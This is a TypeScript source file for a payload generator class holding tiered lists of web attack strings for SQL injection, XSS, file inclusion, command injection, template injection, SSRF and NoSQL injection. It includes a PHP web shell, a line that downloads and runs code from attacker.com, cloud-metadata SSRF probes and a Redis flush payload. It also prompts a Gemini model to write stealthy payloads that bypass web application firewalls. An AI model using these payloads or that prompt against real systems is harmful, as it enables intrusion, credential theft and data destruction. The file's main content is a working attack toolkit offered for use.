import { GoogleGenAI } from "@google/genai";

export interface PayloadTier {
  standard: string[];
  advanced: string[];
  elite: string[];
}

export class PayloadOven {
  private static oven: Record<string, PayloadTier> = {
    'SQLi': {
      standard: [
        "' OR '1'='1",
        "admin' --",
        "admin' #",
        "1 OR 1=1",
        "1' OR '1'='1"
      ],
      advanced: [
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT @@version,NULL,NULL--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'); SELECT pg_sleep(5)--",
        "'; SELECT SLEEP(5)--",
        "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
      ],
      elite: [
        "admin'/*",
        "' OR 1=1 LIMIT 1 --",
        "' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "0x27204f5220313d31",
        "/*%2a/OR/*%2a/1=1",
        "%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--"
      ]
    },
    'XSS': {
      standard: [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "javascript:alert(1)"
      ],
      advanced: [
        "'-alert(1)-'",
        "\";alert(1)//",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<iframe src=\"javascript:alert(1)\">"
      ],
      elite: [
        "<math><mtext><option><annotation><img src=x onerror=alert(1)>",
        "<svg><animatetransform onbegin=alert(1)>",
        "\" onmouseover=\"alert(1)\"",
        "{{constructor.constructor('alert(1)')()}}",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
      ]
    },
    'LFI': {
      standard: [
        "../../etc/passwd",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
      ],
      advanced: [
        "../../../../../../etc/passwd",
        "..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php"
      ],
      elite: [
        "/proc/self/environ",
        "/proc/self/cmdline",
        "../../../../var/log/apache2/access.log",
        "....//....//....//etc/passwd",
        "/etc/passwd%00"
      ]
    },
    'RCE': {
      standard: [
        "$(id)",
        "`id`",
        "| id",
        "; id"
      ],
      advanced: [
        "& id",
        "&& id",
        "|| id",
        "; system('id');"
      ],
      elite: [
        "<?php system($_GET['cmd']); ?>",
        "import os; os.system('id')",
        "eval('id')",
        "exec('id')",
        "$(curl http://attacker.com/`id`|sh)"
      ]
    },
    'SSTI': {
      standard: [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>"
      ],
      advanced: [
        "#{7*7}",
        "*{7*7}",
        "{{self}}",
        "{{config}}"
      ],
      elite: [
        "{{request.application.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        "${{7*7}}",
        "[[7*7]]",
        "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}"
      ]
    },
    'SSRF': {
      standard: [
        "http://127.0.0.1:80",
        "http://localhost:80"
      ],
      advanced: [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://127.0.0.1:22"
      ],
      elite: [
        "http://127.0.0.1:6379",
        "dict://127.0.0.1:6379/SET:test:test",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0aquit%0d%0a",
        "file:///etc/passwd"
      ]
    },
    'NoSQLi': {
      standard: [
        "{\" $gt \": \"\"}",
        "{\"$ne\": null}"
      ],
      advanced: [
        "admin' || '1'=='1",
        "this.password.length > 0"
      ],
      elite: [
        "{\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}}",
        "|| 1==1",
        "'; return true; //"
      ]
    },
    'Command Injection': {
      standard: [
        "; sleep 5",
        "& sleep 5",
        "| sleep 5"
      ],
      advanced: [
        "`sleep 5`",
        "$(sleep 5)",
        "&& sleep 5"
      ],
      elite: [
        "|| sleep 5",
        "; ping -c 5 127.0.0.1",
        "& ping -c 5 127.0.0.1",
        "; timeout 5 /bin/sh"
      ]
    }
  };

  static getPayloads(category?: string, layer: 1 | 2 | 3 = 1, count: number = 10): string[] {
    const layerKey = layer === 1 ? 'standard' : layer === 2 ? 'advanced' : 'elite';
    
    if (category && this.oven[category]) {
      return this.shuffle(this.oven[category][layerKey]).slice(0, count);
    }
    
    // If no category or category not found, return a mix from the specified layer
    const all = Object.values(this.oven).flatMap(tier => tier[layerKey]);
    return this.shuffle(all).slice(0, count);
  }

  static getAllCategories(): string[] {
    return Object.keys(this.oven);
  }

  static async generateCustomPayload(ai: GoogleGenAI | null, category: string, context: string): Promise<string> {
    if (!ai) return this.getPayloads(category, 1, 1)[0];

    const prompt = `As an elite security researcher (argila), generate a highly specialized, stealthy ${category} payload for the following context:
    Context: ${context}
    
    The payload should be designed to bypass modern WAFs and find the exact security gap.
    Return ONLY the raw payload string, no explanation.`;

    try {
      const res = await ai.models.generateContent({
        // FIX: was 'gemini-3.1-pro-preview' which is an invalid model string
        model: 'gemini-1.5-pro',
        contents: prompt
      });
      return res.text?.trim() || this.getPayloads(category, 1, 1)[0];
    } catch (e) {
      return this.getPayloads(category, 1, 1)[0];
    }
  }

  private static shuffle(array: string[]): string[] {
    const newArray = [...array];
    for (let i = newArray.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [newArray[i], newArray[j]] = [newArray[j], newArray[i]];
    }
    return newArray;
  }
}
